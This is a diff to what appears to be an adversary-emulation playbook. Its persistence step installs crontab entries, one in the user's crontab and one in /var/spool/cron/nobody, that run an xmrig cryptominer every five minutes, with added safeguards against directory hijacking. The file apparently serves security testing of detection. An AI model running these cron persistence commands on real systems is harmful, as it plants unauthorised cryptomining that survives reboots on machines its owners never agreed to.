@@ -179,10 +179,17 @@ steps:
 
   - id: step-05
     name: "Attempt persistence via cron (Unit 42 observed TTPs)"
+    # Both crontab lines outlive the run: the beacon does not run
+    # cleanup.commands, and /tmp is emptied at boot. Once /tmp/.xmr is gone any
+    # local user could create it, so each line runs the miner only while one
+    # lstat reads /tmp/.xmr as the 0755 directory step-01 made: owned by the
+    # crontab's own account on the first line, by root on nobody's line. The
+    # first line otherwise removes itself. `%` is written `\%` because a bare
+    # `%` ends a crontab command.
     command: |
       D=/tmp/.xmr; [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }; \
-      (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1") | crontab - 2>/dev/null; \
-      echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json" >> /var/spool/cron/nobody 2>/dev/null || true; \
+      (crontab -l 2>/dev/null; printf '%s\n' '*/5 * * * * if [ "$(stat -c \%F:\%u:\%a /tmp/.xmr 2>/dev/null)" = "directory:$(id -u):755" ]; then /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1; else crontab -l | grep -v xmrig | crontab -; fi') | crontab - 2>/dev/null; \
+      printf '%s\n' '*/5 * * * * if [ "$(stat -c \%F:\%u:\%a /tmp/.xmr 2>/dev/null)" = "directory:0:755" ]; then /tmp/.xmr/xmrig --config /tmp/.xmr/config.json; fi' >> /var/spool/cron/nobody 2>/dev/null || true; \
       echo '[*] Persistence attempt complete'
     identity: container-runtime
     mitre_technique: "T1053.005"
